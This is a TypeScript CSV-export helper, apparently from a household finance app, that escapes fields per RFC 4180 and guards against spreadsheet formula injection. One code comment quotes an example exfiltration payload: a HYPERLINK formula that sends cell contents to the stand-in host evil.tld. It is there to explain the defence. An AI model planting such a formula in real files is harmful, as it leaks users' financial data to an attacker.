import type { Response } from 'express';

/**
 * RAD-156 — shared report CSV formatting.
 *
 * CSV contract: UTF-8 BOM, RFC 4180 escaping (quotes doubled, fields with
 * commas/quotes/newlines wrapped in quotes), numbers as 2-decimal fixed-point
 * so a re-import matches the JSON `data` field byte-for-byte.
 */

/**
 * Leading characters a spreadsheet treats as the start of a formula (or of a DDE
 * command). Excel, LibreOffice and Google Sheets all honour `=`, `+`, `-` and `@`;
 * a leading tab or CR is stripped by the parser before the cell is evaluated, so it
 * smuggles any of the four past a naive check.
 */
const CSV_FORMULA_PREFIX = /^[=+\-@\t\r]/;

/**
 * A plain signed decimal literal. Negative amounts (`-12.34`, produced by `formatAmount`) start
 * with `-` but can never be a formula, and quoting them would break the "a re-import matches the
 * JSON `data` field byte-for-byte" contract this module exists to keep — so they are exempt.
 */
const CSV_NUMERIC_LITERAL = /^-?(?:0|[1-9]\d*)(?:\.\d+)?$/;

/**
 * RFC 4180 escaping plus a formula-injection prefix guard.
 *
 * Exported report rows carry free text the exporting user does not control: category and
 * merchant names typed by a household partner, and transaction descriptions ingested verbatim
 * from the bank feed (an attacker can plant one with a €0.01 transfer reference). Opening such
 * a file in a spreadsheet executes any cell that starts with a formula character, so a value
 * like `=HYPERLINK("https://evil.tld?x="&A1,"Total")` can exfiltrate the victim's whole
 * financial breakdown. Prefixing with a single quote makes the cell inert text.
 */
export function csvEscape(value: unknown): string {
  if (value === null || value === undefined) return '';
  const raw = String(value);
  const str = CSV_FORMULA_PREFIX.test(raw) && !CSV_NUMERIC_LITERAL.test(raw) ? `'${raw}` : raw;
  if (/[",\n\r]/.test(str)) return `"${str.replaceAll('"', '""')}"`;
  return str;
}

export function formatAmount(value: number): string {
  return value.toFixed(2);
}

export function round2(value: number): number {
  return Math.round((value + Number.EPSILON) * 100) / 100;
}

export function sendCsv(res: Response, filename: string, csv: string): Response {
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  return res.send(csv);
}

export function toCsv(header: readonly string[], rows: readonly (readonly unknown[])[]): string {
  const lines = [header.map(csvEscape).join(','), ...rows.map((row) => row.map(csvEscape).join(','))];
  return `\uFEFF${lines.join('\n')}\n`;
}
